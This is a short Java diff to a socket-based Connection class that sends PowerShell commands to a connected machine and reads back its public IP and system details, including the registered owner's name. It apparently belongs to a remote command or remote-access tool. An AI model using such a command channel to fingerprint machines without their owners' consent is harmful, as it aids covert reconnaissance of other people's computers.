@@ -17,13 +17,8 @@ public class Connection {
 	
 	public Connection(Socket socket) throws IOException {
 		s = socket;
-		
 		din = new DataInputStream(s.getInputStream());
 		dout = new DataOutputStream(s.getOutputStream());
-		
-		dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
-		dout.flush();
-		ip = din.readUTF();
 	}
 	
 	public String send(String str) throws IOException {
@@ -96,6 +91,9 @@ public class Connection {
 	public String getSysInfo() throws IOException {
 		String sysInfo = "[not found]";
 		
+		dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
+		dout.flush();
+		ip = din.readUTF();
 		sysInfo = "\n" + "Public ip: " + ip;
 			
 		dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
